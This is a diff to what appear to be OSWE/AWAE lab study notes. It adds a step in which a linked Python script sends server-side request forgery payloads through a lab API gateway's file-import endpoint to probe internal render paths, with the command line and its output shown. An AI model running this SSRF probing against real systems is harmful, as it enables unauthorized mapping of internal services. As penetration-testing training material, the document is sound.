@@ -462,3 +462,20 @@ First, we'll need to build a short wordlist with potential URLs.
 /api/render
 /api/v1/render
 ```
+Then a Python script: [ssrf_path_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_path_scanner.py)
+
+Was written to send SSRF payloads by iterating through a file containing a list of paths.
+
+Output:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000 -p paths.txt --timeout 5
+/       DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+/render DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+/v1/render      DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+/api/render     EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+/api/v1/render  DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+```
